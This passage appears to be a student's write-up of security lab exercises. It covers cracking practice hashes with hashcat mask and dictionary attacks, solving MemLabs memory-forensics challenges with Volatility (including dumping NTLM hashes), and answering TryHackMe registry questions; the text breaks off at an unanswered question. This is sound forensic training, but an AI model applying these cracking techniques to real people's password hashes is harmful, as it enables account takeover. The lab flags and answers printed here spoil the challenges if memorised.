#### a) Đề bài:
Use the techniques and tools discussed earlier to crack the provided hashes:
##### (1)
```
48bb6e862e54f2a795ffc4e541caed4d
```

##### (2)
```
0458ce29e1b0edb36665db68dc96f976dbce98a54696376d7297fce33e56de171d2d7f1ceaa9cbc74dd948c6d13a80dc0d2239ab5abe5f74e4506c9683f13fa7
```

##### (3)
```
11adeb3106116457ba233b1ef0989ff6b15f590cfe1ab0a7ce00401c429bd58c
``` 
> Hint: The password is made up of 5 characters with the first character being an uppercase alphabet, followed by two digits, then a lowercase alphabet, and finally a symbol.

##### (4)
```
$6$sup3rstr0ngs4lt$fZt5XYt.hdLFCs7YOlSIXT.0cDaNIhtP5QdDRdYP6OD349oD8hR9mEYueBRxaSAEHtAJ85wYYNyEELJkb0QSW1
```
> Hint: Google "salt" in the context of hashing.

##### (5)
```
7484c9a3d50e649f50411c58317eb7c6c6e506a94b04ebb87dd8715ce16de0d8e41a4894f9be4bbc7dbc204e1f7103e7b75844f78ce288f89befdfb53f9f5ac8
```
> Hint: The password belongs to someone who has a dog named Scooby and likes to use underscores to separate words. Additionally, the password starts with a capital letter, and the rest of the characters are lowercase. It may be helpful to consult the `rockyou.txt` wordlist and apply some rules using either John or Hashcat.

#### b) Phân tích cách làm:
##### (1)
- Identify the type of hash value:
![image](https://hackmd.io/_uploads/ryqjSnW1fl.png)
It's MD5.
- Trying brute-force attack by using command `hashcat -m 0 -a 3 48bb6e862e54f2a795ffc4e541caed4d`:
![image](https://hackmd.io/_uploads/HyiQD2byfx.png)
The password is `easy`.

##### (2)
- Identify the type of hash value:
![image](https://hackmd.io/_uploads/HyeOPnZ1ze.png)
It's SHA-512.
- Trying brute-force attack by using command `hashcat -m 1700 -a 3 <hash_value>`, we can't find the answer.
- Trying dictionary attack:
![image](https://hackmd.io/_uploads/ByEnKhZJGl.png)
The password is `michael1997`.

##### (3)
- Identify the type of hash value:
![image](https://hackmd.io/_uploads/BkX_9hb1fe.png)
It's SHA-256.
- Trying mask attack by using command `hashcat -m 1400 -a 3 <hash_value> ?u?d?d?l?s`:
![image](https://hackmd.io/_uploads/Bkq-s3-Jzg.png)
The password is `N00b_`.

##### (4)
> Refer to: [Understanding `/etc/shadow` file format on Linux](https://www.cyberciti.biz/faq/understanding-etcshadow-file/)
- As we can see, our format is `$id$salt$hashed`:
    - `id` = `6`: SHA-512
    - `salt` = `sup3rstr0ngs4lt`
    - `hashed` = `fZt5XYt.hdLFCs7YOlSIXT.0cDaNIhtP5QdDRdYP6OD349oD8hR9mEYueBRxaSAEHtAJ85wYYNyEELJkb0QSW1`
- Trying brute-force attack by using command `hashcat -m 1800 -a 3 <$id$salt$hashed`, but I cannot find the answer.
- Trying dictionary attack:
![image](https://hackmd.io/_uploads/HJSJx6-kzx.png)
The password is `batman1234`.

##### (5)
- Identify the type of hash value:
![image](https://hackmd.io/_uploads/rJzUeabkMg.png)
It's SHA-512.
- Trying mask attack by using command `hashcat -m 1700 -a 3 <hash_value> -j 'c' -k '_scooby'`, but we cannot find the ansswer:
- Trying dictionary attack:
![image](https://hackmd.io/_uploads/H1HC76-kfl.png)
The password is `Michael1997_scooby`.

## B. MemLabs:
> Link: https://github.com/stuxnet999/MemLabs

### 1. Lab 0 - Never Too Late Mister:
#### a) Đề bài:
- Bạn tôi, John, là một **nhà hoạt động môi trường** và nhà nhân đạo. Anh ấy **ghét tư tưởng của Thanos** trong phim Avengers: Infinity War. Anh ấy lập trình rất tệ. Anh ấy **dùng rất nhiều biến khi viết chương trình**. Một ngày nọ, John đưa cho tôi một memory dump và nhờ tôi tìm hiểu xem anh ấy đang làm gì trong lúc sao chép dữ liệu. Bạn có thể tìm ra giúp tôi không?
- Link bài lab: https://drive.google.com/file/d/1MjMGRiPzweCOdikO3DTaVfbdBK5kyynT/view

#### b) Phân tích cách làm:
- Ta dùng Volatility 2 để phân tích bài này. Kiểm tra `imageinfo`:
![image](https://hackmd.io/_uploads/H1kHgYjhZx.png)
- Kiểm tra các tiến trình đang chạy:
```
python2 vol.py -f "/mnt/c/Users/Ha Nguyen/Desktop/Challenge/Challenge.raw" --profile=Win7SP1x86 pslist
```
![image](https://hackmd.io/_uploads/ByPxZKinWe.png)
Chú ý thấy có các tiến trình:
`cmd.exe`: Command Prompt
`DumpIt.exe`: Tiến trình dùng để phân tích memory dump.
`Explorer.exe`: Quản lý File Explorer.
- Vì Command Prompt đang chạy nên ta sẽ kiểm tra xem có commands nào đang được thực thi không:
![image](https://hackmd.io/_uploads/BkXBGtihbe.png)
Có một command là `C:\Python27\python.exe C:\Users\hello\Desktop\demon.py.txt`.
- Check Python script vừa tìm được xem nó có output nào không:
![image](https://hackmd.io/_uploads/Hy7RMtonbe.png)
Ta thấy chuỗi hex `335d366f5d6031767631707f`, thử giải mã thì được:
```
3]6o]`1vv1p
```
- Vì trong đề có nhắc đến `environment` nên ta thử kiểm tra biến môi trường:
``` ubuntu
python2 vol.py -f "/mnt/c/Users/Ha Nguyen/Desktop/Challenge/Challenge.raw" --profile=Win7SP1x86 envars
```
Và tìm được:
``` ubuntu
484 services.exe         0x001007f0 Thanos                         xor and password
```
- Thử XOR chuỗi `335d366f5d6031767631707f`:
``` py
a = bytes.fromhex("335d366f5d6031767631707f")

for i in range(256):
    res = "".join(chr(b ^ i) for b in a)
    print(res)
```
Ta tìm được chuỗi output thứ ba `1_4m_b3tt3r}` trong 256 chuỗi output.
- Tiếp tục với phần `password`, trích xuất phần NTLM password hashes:
![image](https://hackmd.io/_uploads/rypbiKoh-l.png)
Dùng tool online:
![image](https://hackmd.io/_uploads/ryYH3ti2We.png)

#### c) Kết quả
`flag{you_are_good_but1_4m_b3tt3r`

### 2. Lab 1 - Beginner's Luck:
> This challenge is composed of 3 flags.

#### a) Đề bài:
- My sister's computer crashed. We were very fortunate to recover this memory dump. Your job is get all her important files from the system. From what we remember, we suddenly saw **a black window pop up with some thing being executed. When the crash happened, she was trying to draw something**. Thats all we remember from the time of crash.
- Link bài lab: https://mega.nz/#!6l4BhKIb!l8ATZoliB_ULlvlkESwkPiXAETJEF7p91Gf9CWuQI70

#### b) Phân tích cách làm:
- Ta dùng Volatility2, kiểm tra `imageinfo`:
![image](https://hackmd.io/_uploads/H1Jc1qj2Wg.png)
- Thử kiểm tra tiến trình đang thực thi:
![image](https://hackmd.io/_uploads/H1m5Nqjn-l.png)
Có thể thấy các tiến trình như `cmd.exe`, `mspaint.exe`, `WinRAR.exe`.
- Kiểm tra Command Prompt:
![image](https://hackmd.io/_uploads/HJk5Snj3be.png)
- Kiểm tra consoles:
![image](https://hackmd.io/_uploads/B1--P5i2Wx.png)
![image](https://hackmd.io/_uploads/r1mUP9o3-x.png)
Ta thấy:
    ```
    C:\Users\SmartNet>St4G3$1
    ZmxhZ3t0aDFzXzFzX3RoM18xc3Rfc3Q0ZzMhIX0=
    ```
    Giải mã chuỗi base64 `ZmxhZ3t0aDFzXzFzX3RoM18xc3Rfc3Q0ZzMhIX0=` ta được `flag{th1s_1s_th3_1st_st4g3!!}`.
- `mspaint.exe` giữ toàn bộ canvas trong RAM, ta thử dump memory của tiến trình này rồi chuyển nó ra Desktop và đổi tên thành `2424.data`:
    ``` ubuntu
    python2 vol.py -f "/mnt/c/Users/Ha Nguyen/Desktop/MemLabs-Lab1/MemoryDump_Lab1.raw" --profile=Win7SP1x64 memdump -p 2424 --dump-dir=./
    ```
    Dùng GIMP mở file vừa rồi phân tích với thông số như sau:
![image](https://hackmd.io/_uploads/Hk7W02jnZl.png)
![image](https://hackmd.io/_uploads/Syg503j2bg.png)
Có thể đọc được là `flag{Good_Boy_good_girl}`
- Kiểm tra `cmdline` của `WinRAR.exe`:
![image](https://hackmd.io/_uploads/HJV81ainZe.png)
Có thể thấy `C:\Users\Alissa Simpson\Documents\Important.rar`, ta dùng `filescan` để lấy offset:
![image](https://hackmd.io/_uploads/ByInxaoh-l.png)
Dump file vừa rồi ra, đổi tên rồi giải nén:
![image](https://hackmd.io/_uploads/H1TimTi3Ze.png)
Có thể thấy flag là ảnh `.png` nhưng file nén này yêu cầu mật khẩu là NTLM hash password của Alissa.
- Lấy NTLM hash password rồi giải nén:
![image](https://hackmd.io/_uploads/BJwG8pinbx.png)
Ta có được hash là `f4ff64c8baac57d22f22edc681055ba6`, chuyển thành chữ in hoa là `F4FF64C8BAAC57D22F22EDC681055BA6`. Giải nén với password vừa tìm được:
![image](https://hackmd.io/_uploads/rkJawpo3Ze.png)
![flag3](https://hackmd.io/_uploads/ryV-_aonZl.png)

#### c) Kết quả:
`flag{th1s_1s_th3_1st_st4g3!!}`
`flag{Good_Boy_good_girl}`
`flag{w3ll_3rd_stage_was_easy}`

### 3. Lab 2 - A New World:
> This challenge is composed of 3 flags.

#### a) Đề bài:
- One of the clients of our company, lost the access to his system due to an unknown error. He is supposedly a very popular "**environmental**" activist. As a part of the investigation, he told us that his **go to applications are browsers**, his **password managers**, etc. We hope that you can dig into this memory dump and find his important stuff and give it back to us.
- Link bài lab: https://mega.nz/#!ChoDHaja!1XvuQd49c7-7kgJvPXIEAst-NXi8L3ggwienE1uoZTk

#### b) Phân tích cách làm:
- Dùng Volatility 2 để giải challenge, ta kiểm tra `imageinfo`:
![image](https://hackmd.io/_uploads/rkm3bCnhbe.png)
- Kiểm tra thử các tiến trình đang chạy:
![image](https://hackmd.io/_uploads/rkz-zRhhWx.png)
Có thể thấy các tiến trình cần nên kiểm tra là `cmd.exe`, `chrome.exe`, `notepad.exe`.
- Thử kiểm tra `cmdscan` và `consoles`:
![image](https://hackmd.io/_uploads/Hkw0fC22Zl.png)
![image](https://hackmd.io/_uploads/Bk-G7RhhZe.png)
Ta thấy `Nothing here kids :)` .-.
- Kiểm tra thử các biến môi trường ta thấy được một số điểm đáng nghi:
![image](https://hackmd.io/_uploads/SkO67A22Zl.png)
Decode mã base64 `ZmxhZ3t3M2xjMG0zX1QwXyRUNGczXyFfT2ZfTDRCXzJ9` thì ta được `flag{w3lc0m3_T0_$T4g3_!_Of_L4B_2}`.
![image](https://hackmd.io/_uploads/rkVeNA22-l.png)
- Kiểm tra lịch sử trình duyệt:
![image](https://hackmd.io/_uploads/SJUC8AnnZl.png)
![image](https://hackmd.io/_uploads/rJ1ePA3nZe.png)
![image](https://hackmd.io/_uploads/SyagPA3nWl.png)
Có rất nhiều sự đáng nghi ở đây, cụ thể là `Password.png`, `Hidden.kdbx` (KeePass database (password manager), `SW1wb3J0YW50.rar` (decode base64 được `Important.rar`, `stAg3_5.txt`. Thử tìm offset của các file trên rồi dump ra:
![image](https://hackmd.io/_uploads/SyyhqAhnZl.png)
Chỉ được hai file .-.
- Mở `Password.png`:
![image](https://hackmd.io/_uploads/ByK6nCh3Zg.png)
Có dòng chữ nhỏ là `P4SSw0rd_123`
- Chạy `keepass2 Hidden.kdbx` rồi nhập password vừa tìm được để vào:
![image](https://hackmd.io/_uploads/ryz26R3hWl.png)
Thử tìm thì:
![image](https://hackmd.io/_uploads/BJJQJkphbg.png)
![image](https://hackmd.io/_uploads/SJyVy1p2be.png)
Ta tìm được `flag{w0w_th1s_1s_Th3_SeC0nD_ST4g3_!!}`
- Tải plugin `chromehistory` về rồi chạy plugin:
    ``` ubuntu
    cd ~/volatility/volatility/plugins
    wget https://raw.githubusercontent.com/superponible/volatility-plugins/master/chromehistory.py
    wget https://raw.githubusercontent.com/superponible/volatility-plugins/master/sqlite_help.py
    pip2 install construct==2.8.10
    ```
    ![image](https://hackmd.io/_uploads/SkV0_k62Zg.png)
Ta tìm được một [mega link](https://mega.nz/#F!TrgSQQTS!H0ZrUzF0B-ZKNM3y9E76lg), truy cập thử thì:
![image](https://hackmd.io/_uploads/ryfUFkTnWe.png)
- Tải file về và giải nén thì ta bị yêu cầu password như sau:
![image](https://hackmd.io/_uploads/BkZec1p3Wg.png)
Lấy password:
![image](https://hackmd.io/_uploads/B1579JanWe.png)
Giải nén file với password trên:
![Important](https://hackmd.io/_uploads/H1rziypnWe.png)

#### c) Kết quả:
`flag{w3lc0m3_T0_$T4g3_!_Of_L4B_2}`
`flag{w0w_th1s_1s_Th3_SeC0nD_ST4g3_!!}`
`flag{oK_So_Now_St4g3_3_is_DoNE!!}`

### 4. Lab 3 - The Evil's Den:
#### a) Đề bài:
- A malicious script encrypted a very secret piece of information I had on my system. Can you recover the information for me please?
> - Note-1: This challenge is composed of only 1 flag. The flag split into 2 parts.
> - Note-2: You'll need the first half of the flag to get the second
> - You will need this additional tool to solve the challenge:
> ``` ubuntu
> $ sudo apt install steghide
> ```
- Link bài lab: https://mega.nz/#!2ohlTAzL!1T5iGzhUWdn88zS1yrDJA06yUouZxC-VstzXFSRuzVg

#### b) Phân tích cách làm:
- Kiểm tra `imageinfo`:
![image](https://hackmd.io/_uploads/rJqMzHU6-g.png)
- Kiểm tra các tiến trình đang chạy:
![image](https://hackmd.io/_uploads/B1MuGBU6Ze.png)
Các tiến trình `notepad.exe`, `msiexec.exe`, `audiodg.exe`, `wuauclt.exe` có vẻ nên được kiểm tra thêm.
- Kiểm tra `cmdline`:
![image](https://hackmd.io/_uploads/rk0twr8TWe.png)
Thấy có `C:\Users\hello\Desktop\evilscript.py` và `C:\Users\hello\Desktop\vip.txt` khá đáng nghi. Tìm offset của các file trên rồi dump ra:
![image](https://hackmd.io/_uploads/S1gVcH8pbg.png)
Đọc nội dung của hai file trên:
![image](https://hackmd.io/_uploads/BkM2qSLaWl.png)
Giải mã `vip.txt` từ script trên:
    ``` py
    import base64

    def decrypt(data):
        decoded = base64.b64decode(data).decode('utf-8')
        original = ''.join(chr(ord(i) ^ 3) for i in decoded)
        return original

    encoded_str = "am1gd2V4M20wXGs3b2U="
    print(decrypt(encoded_str))
    ```
    Ta được phần đầu của flag là `inctf{0n3_h4lf`.
- Kiểm tra `cmdscan` và `consoles`:
![image](https://hackmd.io/_uploads/r1pTQrI6-l.png)
![image](https://hackmd.io/_uploads/HJmeVSU6Zl.png)
Kết quả rất là hỏi chấm?
![image](https://hackmd.io/_uploads/S1_NErIpZe.png)
Không có gì đặc biệt trong `consoles`.
- Kiểm tra `envars`:
![image](https://hackmd.io/_uploads/B11pNHLaWg.png)
- Vì đề bài có gợi ý đến `steghide` nên nghĩa là có file ảnh hoặc âm thanh nào đó, thử tìm nó:
![image](https://hackmd.io/_uploads/ByagaBIpWe.png)
Có rất nhiều nhưng ta chú ý đến:
    ``` ubuntu
    0x0000000004f34148      2      0 RW---- \Device\HarddiskVolume2\Users\hello\Desktop\suspision1.jpeg
    ```
    Thử dump nó ra và đổi tên:
    ![image](https://hackmd.io/_uploads/SyhTpB8aZl.png)
- Vì đề bài gợi ý cần nửa đầu flag để có nửa sau, khi tìm hiểu cách dùng `steghide` thì ta có:
![image](https://hackmd.io/_uploads/ByqYJ8LaZg.png)
Thử dùng `inctf{0n3_h4lf` như một passphrase:
![image](https://hackmd.io/_uploads/rke4gUL6-x.png)
Đọc nội dung của file được xuất, ta tìm được nửa còn lại của flag là `_1s_n0t_3n0ugh}`.
#### c) Kết quả:
`inctf{0n3_h4lf_1s_n0t_3n0ugh}`

### 6. Lab 5 - Black Tuesday:
#### a) Đề bài:
We received this memory dump from our client recently. Someone **accessed his system** when he was not there and he found **some rather strange files being accessed**. Find those files and they might be useful. I quote his exact statement,
> The **names were not readable**. They were **composed of alphabets and numbers** but I wasn't able to make out what exactly it was.

Also, he noticed his **most loved application that he always used crashed every time he ran it**. Was it a **virus**?

> Note-1: This challenge is composed of 3 flags. If you think 2nd flag is the end, it isn't!! :P
> Note-2: There was a small mistake when making this challenge. If you find any string which has the string "L4B_3_D0n3!!" in it, please change it to "L4B_5_D0n3!!" and then proceed.
> Note-3: You'll get the stage 2 flag only when you have the stage 1 flag.
- Link bài lab: https://mega.nz/#!Ps5ViIqZ!UQtKmUuKUcqqtt6elP_9OJtnAbpwwMD7lVKN1iWGoec

#### b) Phân tích kết quả:
- Check the `imageinfo`:
![image](https://hackmd.io/_uploads/SySWYoOTWx.png)
- Check for plugin `pstree`:
![image](https://hackmd.io/_uploads/ryujz2OpWg.png)
Maybe `NOTEPAD.EXE` is suspecious because we have `notepad.exe`. Moreover, `WinRAR.exe` and `WerFault.exe` are also suspects. As we can see, `explorer.exe` is the parent of `NOTEPAD.EXE`, and I think this point is normal, but `NOTEPAD.EXE` is still suspecious. Especially, there are various processes of `NOTEPAD.EXE`.
- Check for plugins `cmdline`, `cmdscan`, and `consoles`:
![image](https://hackmd.io/_uploads/S1HrCoO6bx.png)
By using plugin `cmdline`, as we can see, there are some suspecious objects that we discussed earlier, and the PID of `NOTEPAD.EXE` is `2724`. We have to investigate `SW1wb3J0YW50.rar`. In contrast, I didn't found any abnormalities by using plugin.
![image](https://hackmd.io/_uploads/B1qaghda-x.png)
![image](https://hackmd.io/_uploads/B1PAenup-l.png)
- Dump `NOTEPAD.EXE` by using command `procdump -p <PID> -D ./` to extract from RAM:
![image](https://hackmd.io/_uploads/SJfFEJK6bl.png)
Using `strings` and the output is:
![image](https://hackmd.io/_uploads/H1k_rkt6Zl.png)
This code is often embedded into `.exe` file to said to Windows that it was Notepad and require rights to use necessary interface libaries. Trying using Detect It Easy to investigate `executable.2724.exe`:
![image](https://hackmd.io/_uploads/S1xqsy66Zx.png)
The file was written by C/C++ so I will use IDA or Cutter to analyse it later.
- Check for plugin `iehistory`:
![image](https://hackmd.io/_uploads/SJd8n3u6be.png)
![image](https://hackmd.io/_uploads/BJDD23d6Wl.png)
![image](https://hackmd.io/_uploads/Hyjdn3_6be.png)
![image](https://hackmd.io/_uploads/H19hnhOp-e.png)
![image](https://hackmd.io/_uploads/r1rhTnOTZx.png)
![image](https://hackmd.io/_uploads/BkBGRnOpZg.png)
![image](https://hackmd.io/_uploads/HkaCAn_Tbg.png)
There are some suspecious file like `Important.rar`, `SW1wb3J0YW50.rar`, `stAg3_5.txt`, `Password.png`, `New%20Text%20Document.txt`, `Hidden.kdbx`, `ZmxhZ3shIV93M0xMX2QwbjNfU3Q0ZzMtMV8wZl9MNEJfM19EMG4zXyEhfQ.bmp`, and `St4g3$1.txt`. If I click links in the output, the results are `Error 404`, or they shows normal output. Besides that, when I decode some base64 codes in the output above, they are unreadable, except `ZmxhZ3shIV93M0xMX2QwbjNfU3Q0ZzMtMV8wZl9MNEJfM19EMG4zXyEhfQ`:
![image](https://hackmd.io/_uploads/BylwPb6u6-l.png)
The first flag is `flag{!!_w3LL_d0n3_St4g3-1_0f_L4B_5_D0n3_!!}` because in `Note-2` of the description, they said that `L4B_5_D0n3!!` is the correct string, not the string `L4B_3_D0n3!!`.
- Find the offset of suspecious files above:
![image](https://hackmd.io/_uploads/H1mXS6uabx.png)
Maybe `Important.rar`, `stAg3_5.txt`, `Password.png`, `New%20Text%20Document.txt`, `Hidden.kdbx`, `ZmxhZ3shIV93M0xMX2QwbjNfU3Q0ZzMtMV8wZl9MNEJfM19EMG4zXyEhfQ.bmp`, and `St4g3$1.txt` were deleted. I will dump `SW1wb3J0YW50.rar`:
![image](https://hackmd.io/_uploads/HJOBPTd6Zx.png)
![image](https://hackmd.io/_uploads/H1rVDaua-g.png)
We need a password for `Stage2.png`, so we have to check for `.mft` file to find traces of file deletion by using plugin `mftparser > mft_report.txt`.
![image](https://hackmd.io/_uploads/S1SpdTuTWx.png)
We cannot find anything, so we will try another way.
- Because the description said "You'll get the stage 2 flag only when you have the stage 1 flag" so I think `flag{!!_w3LL_d0n3_St4g3-1_0f_L4B_5_D0n3_!!}` is the password. We will try it:
![image](https://hackmd.io/_uploads/HkBoHCdp-g.png)
It works .-.
![image](https://hackmd.io/_uploads/rJeGU0_a-g.png)
The second flag is `flag{W1th_th1s_$taGe_2_1s_c0mPL3T3_!!}`
- Using Cutter to analyse `executable.2724.exe` (Static Analysis):
![image](https://hackmd.io/_uploads/S1qG9yF6Ze.png)
![image](https://hackmd.io/_uploads/ryeC31Yabg.png)
The third flag is `bi0s{M3m_l4b5_OVeR_!}`.
> When we use IDA to analyse the file:
> ![image](https://hackmd.io/_uploads/SkEBlx6aZl.png)
> ![image](https://hackmd.io/_uploads/rySwllaTZg.png)

> These commands below will help us to download and install Cuttter:
> ``` ubuntu
> wget https://github.com/rizinorg/cutter/releases/download/v2.2.0/Cutter-v2.2.0-Linux-x86_64.AppImage
> chmod +x Cutter-v2.2.0-Linux-x86_64.AppImage
> ./Cutter-v2.2.0-Linux-x86_64.AppImage --appimage-extract
> ./squashfs-root/AppRun
> ```

> How to install DIE - Detect It Easy:
> - Run these commands below:
> ``` ubuntu
> sudo apt update
> sudo apt install libqt5gui5 libqt5core5a libqt5widgets5 libqt5network5 libqt5script5 libqt5scripttools5 -y
> ```
> - Access this [link](https://github.com/horsicq/DIE-engine/releases) and copy the link of the lastest version of `.deb` file that we want to download, then run `wget <link>`.
> - Run these commands below:
> ``` ubuntu
> sudo dpkg -i die_*.deb
> sudo apt --fix-broken install -y
> ```

#### c) Kết quả:
`flag{!!_w3LL_d0n3_St4g3-1_0f_L4B_5_D0n3_!!}`
`flag{W1th_th1s_$taGe_2_1s_c0mPL3T3_!!}`
`bi0s{M3m_l4b5_OVeR_!}`

### 7. Lab 6 - The Reckoning:
#### a) Đề bài:
- We received this memory dump **from the Intelligence Bureau Department**. They say this evidence might hold **some secrets of the underworld gangster David Benjamin**. This memory dump was taken from one of his workers whom the FBI busted earlier this week. Your job is to go through the memory dump and see if you can figure something out. FBI also says that **David communicated with his workers via the internet** so that might be a good place to start.
> Note: This challenge is composed of 1 flag split into 2 parts.
> The flag format for this lab is: `inctf{s0me_l33t_Str1ng}`
- Link bài lab: https://mega.nz/#!C0pjUKxI!LnedePAfsJvFgD-Uaa4-f1Tu0kl5bFDzW6Mn2Ng6pnM

#### b) Phân tích cách làm:
- Check for `imageinfo`:
![image](https://hackmd.io/_uploads/SJj4T9j6-x.png)
- Check for `pstree`:
![image](https://hackmd.io/_uploads/H1bv1soT-l.png)
As we can see, `WinRAR.exe`, `cmd.exe` and `firefox.exe` are some suspects.
- Check for `cmdline`, `cmdscan` and `consoles`:
![image](https://hackmd.io/_uploads/rk4K4jsabe.png)
![image](https://hackmd.io/_uploads/r1eH-sjpWl.png)
![image](https://hackmd.io/_uploads/HJb9-jspZg.png)
Perhaps `AUDIODG.EXE`, `chrome.exe`, and `WmiApSrv.exe` is also suspects. Moreover, we found `flag.rar`.
![image](https://hackmd.io/_uploads/BJ92MjiaZe.png)
![image](https://hackmd.io/_uploads/rJK5Qsj6bx.png)
When I checked two plugins `cmdscan` and `consoles`, I saw strings `whoami` and `env`.
- Trying finding the offset of `flag.rar`:
![image](https://hackmd.io/_uploads/HJXpNoopWx.png)
Dump it to investigate:
![image](https://hackmd.io/_uploads/B1ASBooTWl.png)
I have to find the password to unrar `flag.rar`.
- Check for plugin `iehistory`:
![image](https://hackmd.io/_uploads/B1Jx5oipbl.png)
![image](https://hackmd.io/_uploads/H1KTussTWe.png)
![image](https://hackmd.io/_uploads/ry24ujopZg.png)
![image](https://hackmd.io/_uploads/H1N8_ijaZe.png)
I think these file above are so suspecious. I will find the offset:
![image](https://hackmd.io/_uploads/SyKfosjabg.png)
We cannot find anything.
- Download plugin `firefoxhistory` with the code below:
    ``` ubuntu
    cd ~/volatility/volatility/plugins
    wget https://raw.githubusercontent.com/superponible/volatility-plugins/master/firefoxhistory.py
    wget https://raw.githubusercontent.com/superponible/volatility-plugins/master/sqlite_help.py
    pip2 install construct==2.8.10
    ```
    Check for `firefoxhistory` and nothing happened:
    ![image](https://hackmd.io/_uploads/BJMA0ij6Ze.png)
    Check for `chromehistory` and I found this:
    ![image](https://hackmd.io/_uploads/rkmXb3o6Wg.png)
    Trying accessing the [link](https://pastebin.com/RSGSi1hk):
    ![image](https://hackmd.io/_uploads/H1RUb2j6bx.png)
    I found a [link](https://www.google.com/url?q=https://docs.google.com/document/d/1lptcksPt1l_w7Y29V4o6vkEnHToAPqiCkgNNZfS9rCk/edit?usp%3Dsharing&sa=D&source=hangouts&ust=1566208765722000&usg=AFQjCNHXd6Ck6F22MNQEsxdZo21JayPKug) of Google Docs and the name `David`. Trying accessing the link:
    ![image](https://hackmd.io/_uploads/SyQ1Gns6-l.png)
    ![image](https://hackmd.io/_uploads/Syooz3jaZe.png)
    And I found a [link](https://mega.nz/#!SrxQxYTQ). Access it:
    ![image](https://hackmd.io/_uploads/S1xJlQhj6bx.png)
    Damn :) We need a key. We know that David sent the key in mail, but I got stuck and tried using all plugins of Volatility, and...:
    ![image](https://hackmd.io/_uploads/S1ThL3jpZe.png)
    In `session_1.WinSta0.Default.png`:
    ![session_1.WinSta0.Default](https://hackmd.io/_uploads/ryhcP2sa-g.png)
    I will trying finding the string `Mega Drive Key` in `MemoryDump_Lab6.raw`:
    ![image](https://hackmd.io/_uploads/BJXV32iTbx.png)
    And we found the key is `zyWxCjCYYSEMA-hZe552qWVXiPwa5TecODbjnsscMIU`. Use it to break the code and then I received `flag_.png`, but:
    ![image](https://hackmd.io/_uploads/BJeosnjTWl.png)
    The file is corrupted :) Check the image file by `xxd` and what I saw:
    ![image](https://hackmd.io/_uploads/S16-anjpZg.png)
    It must be `IHDR` instead of `iHDR`, so I have to change `i (69)` to `I (49)` by HxD:
    ![image](https://hackmd.io/_uploads/SkcyC3ia-g.png)
    After I changed it:
    ![image](https://hackmd.io/_uploads/H1VUR2oaWl.png)
    ![flag_](https://hackmd.io/_uploads/BJZuR2spZg.png)
    The first part of the flag is `inctf{thi5_cH4LL3Ng3_!s_g0nn4_b3_}`.
- Trying checking for environment variables:
![image](https://hackmd.io/_uploads/SkPRyTjTZx.png)
And luckily, the password of `flag.rar` is `easypeasyvirus`. Unrar the file:
![image](https://hackmd.io/_uploads/rkLNgpoaZl.png)
![image](https://hackmd.io/_uploads/H1mdeTi6Wl.png)
The last part of flag is `aN_Am4zINg_!_i_gU3Ss???_}`
#### c) Kết quả:
`inctf{thi5_cH4LL3Ng3_!s_g0nn4_b3_aN_Am4zINg_!_i_gU3Ss???_}`

## C. TryHackMe:
### I. Task 10 - Windows Forensics 1:
*Link tham khảo: [TryHackMe](https://tryhackme.com/room/windowsforensics1)*
#### 1. Đề bài:
##### a) The Setup:
- If preferred, use the following credentials to log into the machine:
    - Username: `THM-4n6`
    - Password: `123`
- Once we log in, we will see two folders on the Desktop named triage and EZtools. The triage folder contains a triage collection collected through KAPE, which has the same directory structure as the parent. This is where our artifacts will be located. The EZtools folder contains Eric Zimmerman's tools, which we will be using to perform our analysis. You will also find RegistryExplorer, EZViewer, and AppCompatCacheParser.exe in the same folder.

**Note**: *Although the Autopsy tool on the Desktop can be used to solve this case, it is recommended that you use the EZtools, as demonstrated in this room.*

##### b) The Challenge:
- Now that we know where the required toolset is, we can start our investigation. We will have to use our knowledge to identify where the different files for the relevant registry hives are located and load them into the tools of our choice. Let's answer the questions below using our knowledge of registry forensics.

- **Scenario:**
One of the Desktops in the research lab at Organization X is suspected to have been accessed by someone unauthorized. Although they generally have only one user account per Desktop, there were multiple user accounts observed on this system. It is also suspected that the system was connected to some network drive, and a USB device was connected to the system. The triage data from the system was collected and placed on the attached VM. Can you help Organization X with finding answers to the below questions?

**Note:** *When loading registry hives in RegistryExplorer, it will caution us that the hives are dirty. This is nothing to be afraid of. We just need to remember the little lesson about transaction logs and point RegistryExplorer to the .LOG1 and .LOG2 files with the same filename as the registry hive. It will automatically integrate the transaction logs and create a 'clean' hive. Once we tell RegistryExplorer where to save the clean hive, we can use that for our analysis and we won't need to load the dirty hives anymore. RegistryExplorer will guide you through this process.*

#### 2. Phân tích cách làm: 
- Kịch bản challenge cho biết rằng một Desktop ở phòng lab Organization X đã bị ai đó đột nhập trái phép. Bình thường chỉ có một account trên máy nhưng họ đã phát hiện ra rất nhiều accounts khác, và có vẻ kẻ đột nhập đã dùng USB để kết nối tới hệ thống.
- Khi vào lab, vì đây là máy ảo Windows 7 và ta nhận thấy rằng cần phải hiển thị các hidden file bằng cách vào `File Explorer Options` $\rightarrow$ `View` trong Search Bar và chọn `Shows hidden files, folders, and drivers`.
![image](https://hackmd.io/_uploads/ByoJufqAee.png)


##### a) How many user created accounts are present on the system?
- Để kiểm tra thông tin tài khoản của user, ta đi đến vị trí `SAM\Domains\Account\Users\` trong tool Registry Explorer (mở trong `EZtools`).
- Tại phần `Names`, ta được các account user sau:
![image](https://hackmd.io/_uploads/B13j_z50lx.png)
- Ngoại trừ các built-in account mặc định như `Administrator`, `DefaultAccount`, `Guest`, `WDAGUtilityAccount` thì ta thấy rằng có ba account user khác là `THM-4n6`, `thm-user`, `thm-user2`.

**$\rightarrow$ Đáp án cần điền là `3`.**

##### b) What is the username of the account that has never been logged in?
- Để xác nhận user account có profile trên máy, ta vào địa chỉ `SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\` bằng tool trên. Trong `ProfileList` ta có:
![image](https://hackmd.io/_uploads/SymCczqCex.png)
- Chú ý tại hai mục cuối cùng, tại phần `Value` ta thấy hai giá trị là `C:\Users\THM-4n6` và `C:\Users\thm-user`, điều này có nghĩa là account `thm-user2` không bao giờ đăng nhập vào.
![image](https://hackmd.io/_uploads/Bk-Q0zcAlx.png)
![image](https://hackmd.io/_uploads/ryLN0zcRxg.png)

**$\rightarrow$ Đáp án cần điền là `thm-user2`.**

##### c) What's the password hint for the user `THM-4n6`?
Vào `SAM\Domains\Account\Users\` và dò từng mục, đến mục `000003E9`, `000003EA` và `000003EB` tại phần `Value Name` có `UserPasswordHint`, nhưng ta thấy rằng chỉ có `000003E9` có hint là `c.o.u.n.t`, hai cái còn lại là `n.u.l.l`.
![image](https://hackmd.io/_uploads/B1pyxm5Rex.png)

**$\rightarrow$ Đáp án cần điền là `count`.**

##### d) When was the file `Changelog.txt`'` accessed?
